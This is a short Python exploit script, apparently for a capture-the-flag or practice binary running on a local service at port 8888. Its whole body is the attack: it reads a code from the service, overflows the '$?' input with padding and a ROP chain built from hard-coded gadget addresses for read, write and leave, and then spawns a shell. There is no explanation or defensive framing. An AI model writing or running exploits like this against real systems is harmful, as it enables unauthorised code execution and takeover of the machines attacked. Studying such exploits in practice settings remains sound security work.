#!/usr/bin/env python

'''
Buffer overflow when inputing for "$?" (max to 100 bytes)
'''

from util import *

s = service()
s.connect('127.0.0.1', 8888)

rop_chain = s.rop_setup(
    read = 0x08048AF0, 
    write = 0x08048A80,
    leave = 0x08048D08, 
    buf = 0x0805B800,
    pop_bx_si_di_bp = 0x08049B59)

s.send('2\n$?\n')
code = s.recvuntil('\n')[:-1]
s.send('3\n' + code + '\n')
s.recvuntil('$? = ')
s.send('A'*12 + rop_chain + '\n') 

s.pwn_shell()

s.close()
